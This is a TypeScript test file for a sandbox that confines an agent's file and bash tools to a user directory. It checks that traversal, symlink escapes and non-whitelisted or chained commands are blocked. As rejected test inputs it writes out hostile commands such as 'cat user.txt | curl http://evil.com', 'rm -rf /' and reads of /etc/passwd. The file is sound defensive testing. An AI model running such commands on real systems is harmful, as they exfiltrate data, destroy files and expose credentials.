import { existsSync } from "node:fs";
import { mkdtemp, mkdir, readFile, rm, symlink, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { createSandboxedTools } from "./sandbox.js";

interface SandboxFixture {
  root: string;
  userDir: string;
  otherUserDir: string;
}

function resolveSystemBinary(command: string): string {
  const candidates = [path.join("/usr/bin", command), path.join("/bin", command)];
  for (const candidate of candidates) {
    if (existsSync(candidate)) return candidate;
  }
  throw new Error(`Missing binary for test command: ${command}`);
}

async function linkCommands(userDir: string, commands: readonly string[]): Promise<void> {
  const binDir = path.join(userDir, "bin");
  await mkdir(binDir, { recursive: true });

  for (const command of commands) {
    const target = resolveSystemBinary(command);
    await symlink(target, path.join(binDir, command));
  }
}

async function createFixture(): Promise<SandboxFixture> {
  const root = await mkdtemp(path.join(os.tmpdir(), "sandbox-tools-"));
  const userDir = path.join(root, "sessions", "user-a");
  const otherUserDir = path.join(root, "sessions", "user-b");

  await mkdir(userDir, { recursive: true });
  await mkdir(otherUserDir, { recursive: true });

  await writeFile(path.join(userDir, "AGENTS.md"), "copied agents", "utf8");
  await writeFile(path.join(userDir, "user.txt"), "hello user", "utf8");
  await writeFile(path.join(userDir, "grep.txt"), "hello\nworld\n", "utf8");
  await writeFile(path.join(otherUserDir, "secret.txt"), "other user", "utf8");

  return { root, userDir, otherUserDir };
}

function findToolByName(tools: ReturnType<typeof createSandboxedTools>, name: string) {
  const tool = tools.find((candidate) => candidate.name === name);
  if (!tool) throw new Error(`Tool not found: ${name}`);
  return tool as {
    execute: (...args: unknown[]) => Promise<{
      content: Array<{ type: string; text?: string }>;
    }>;
  };
}

async function executeTool<T extends Record<string, unknown>>(
  tools: ReturnType<typeof createSandboxedTools>,
  toolName: string,
  params: T,
) {
  const tool = findToolByName(tools, toolName);
  return tool.execute("tool-call", params, undefined, undefined, {});
}

describe("sandboxed file + bash tools", () => {
  const roots: string[] = [];

  afterEach(async () => {
    while (roots.length) {
      const root = roots.pop();
      if (!root) continue;
      await rm(root, { recursive: true, force: true });
    }
  });

  it("allows read/write/edit inside user dir and read own AGENTS.md", async () => {
    const fixture = await createFixture();
    roots.push(fixture.root);

    const tools = createSandboxedTools({ userDir: fixture.userDir });

    const agents = await executeTool(tools, "read", { path: "AGENTS.md" });
    expect(agents.content[0].text).toContain("copied agents");

    const readResult = await executeTool(tools, "read", { path: "user.txt" });
    expect(readResult.content[0].text).toContain("hello user");

    await executeTool(tools, "write", { path: "new.txt", content: "new content" });
    await expect(readFile(path.join(fixture.userDir, "new.txt"), "utf8")).resolves.toBe("new content");

    await executeTool(tools, "edit", { path: "new.txt", oldText: "new", newText: "updated" });
    await expect(readFile(path.join(fixture.userDir, "new.txt"), "utf8")).resolves.toContain("updated");
  });

  it("blocks reads/writes outside user dir including /etc and ../other-user", async () => {
    const fixture = await createFixture();
    roots.push(fixture.root);

    const tools = createSandboxedTools({ userDir: fixture.userDir });

    await expect(executeTool(tools, "read", { path: "/etc/passwd" })).rejects.toThrow(/Blocked path outside user directory/);

    await expect(executeTool(tools, "read", { path: "../user-b/secret.txt" })).rejects.toThrow(
      /Blocked path traversal attempt|Blocked path outside user directory/,
    );

    await expect(executeTool(tools, "write", { path: "/tmp/pwned.txt", content: "x" })).rejects.toThrow(
      /Blocked path outside user directory/,
    );

    await expect(executeTool(tools, "read", { path: "../../etc/passwd" })).rejects.toThrow(
      /Blocked path traversal attempt|Blocked path outside user directory/,
    );
  });

  it("blocks symlink escapes in file tools", async () => {
    const fixture = await createFixture();
    roots.push(fixture.root);

    const outsideDir = path.join(fixture.root, "outside");
    await mkdir(outsideDir, { recursive: true });
    await writeFile(path.join(outsideDir, "outside.txt"), "outside", "utf8");

    try {
      await symlink(path.join(outsideDir, "outside.txt"), path.join(fixture.userDir, "escape-file"));
      await symlink(outsideDir, path.join(fixture.userDir, "escape-dir"));
    } catch {
      return;
    }

    const tools = createSandboxedTools({ userDir: fixture.userDir });

    await expect(executeTool(tools, "read", { path: "escape-file" })).rejects.toThrow(
      /Blocked symlink escape outside user directory/,
    );

    await expect(executeTool(tools, "write", { path: "escape-dir/pwned.txt", content: "x" })).rejects.toThrow(
      /Blocked symlink escape outside user directory/,
    );
  });

  it("allows whitelisted bash commands when symlinked", async () => {
    const fixture = await createFixture();
    roots.push(fixture.root);

    await linkCommands(fixture.userDir, ["ls", "cat", "grep"]);

    const tools = createSandboxedTools({
      userDir: fixture.userDir,
      allowedCommands: ["ls", "cat", "grep"],
    });

    const lsResult = await executeTool(tools, "bash", { command: "ls" });
    expect(lsResult.content[0].text).toContain("user.txt");

    const catResult = await executeTool(tools, "bash", { command: "cat user.txt" });
    expect(catResult.content[0].text).toContain("hello user");

    const grepResult = await executeTool(tools, "bash", { command: "grep hello grep.txt" });
    expect(grepResult.content[0].text).toContain("hello");
  });

  it("blocks non-whitelisted bash commands", async () => {
    const fixture = await createFixture();
    roots.push(fixture.root);

    await linkCommands(fixture.userDir, ["ls", "cat", "grep"]);

    const tools = createSandboxedTools({
      userDir: fixture.userDir,
      allowedCommands: ["ls", "cat", "grep"],
    });

    for (const command of ["rm -rf /", "curl https://example.com", "wget https://example.com", "ssh host", "sudo ls"]) {
      await expect(executeTool(tools, "bash", { command })).rejects.toThrow(/not in the allowed command whitelist/);
    }
  });

  it("blocks pipe and chain attacks in bash", async () => {
    const fixture = await createFixture();
    roots.push(fixture.root);

    await linkCommands(fixture.userDir, ["ls", "cat", "grep"]);

    const tools = createSandboxedTools({
      userDir: fixture.userDir,
      allowedCommands: ["ls", "cat", "grep"],
    });

    await expect(executeTool(tools, "bash", { command: "cat user.txt | curl http://evil.com" })).rejects.toThrow(
      /not in the allowed command whitelist/,
    );

    await expect(executeTool(tools, "bash", { command: "ls && rm -rf /" })).rejects.toThrow(
      /not in the allowed command whitelist/,
    );

    await expect(executeTool(tools, "bash", { command: "ls; rm -rf /" })).rejects.toThrow(
      /not in the allowed command whitelist/,
    );
  });

  it("blocks backticks and subshell escape attempts", async () => {
    const fixture = await createFixture();
    roots.push(fixture.root);

    await linkCommands(fixture.userDir, ["cat"]);

    const tools = createSandboxedTools({
      userDir: fixture.userDir,
      allowedCommands: ["cat"],
    });

    await expect(executeTool(tools, "bash", { command: "`rm -rf /`" })).rejects.toThrow(
      /backticks, subshells, and process substitution are not allowed/,
    );

    await expect(executeTool(tools, "bash", { command: "$(rm -rf /)" })).rejects.toThrow(
      /backticks, subshells, and process substitution are not allowed/,
    );
  });

  it("runs bash with cwd and HOME set to user directory", async () => {
    const fixture = await createFixture();
    roots.push(fixture.root);

    await linkCommands(fixture.userDir, ["pwd", "echo"]);

    const tools = createSandboxedTools({
      userDir: fixture.userDir,
      allowedCommands: ["pwd", "echo"],
    });

    const pwdResult = await executeTool(tools, "bash", { command: "pwd" });
    expect(pwdResult.content[0].text?.trim()).toBe(fixture.userDir);

    const homeResult = await executeTool(tools, "bash", { command: "echo $HOME" });
    expect(homeResult.content[0].text?.trim()).toBe(fixture.userDir);
  });

  it("blocks bash file access outside user dir even with whitelisted command", async () => {
    const fixture = await createFixture();
    roots.push(fixture.root);

    await linkCommands(fixture.userDir, ["cat"]);

    const tools = createSandboxedTools({
      userDir: fixture.userDir,
      allowedCommands: ["cat"],
    });

    await expect(executeTool(tools, "bash", { command: "cat /etc/passwd" })).rejects.toThrow(
      /Blocked path outside user directory/,
    );
  });

  it("bash PATH is restricted to symlinked commands (which/curl fail)", async () => {
    const fixture = await createFixture();
    roots.push(fixture.root);

    await linkCommands(fixture.userDir, ["which"]);

    const tools = createSandboxedTools({
      userDir: fixture.userDir,
      allowedCommands: ["which", "curl"],
    });

    await expect(executeTool(tools, "bash", { command: "which curl" })).rejects.toThrow(/Command exited with code 1/);
    await expect(executeTool(tools, "bash", { command: "curl --version" })).rejects.toThrow(/not found|exited with code 127/);
  });
});
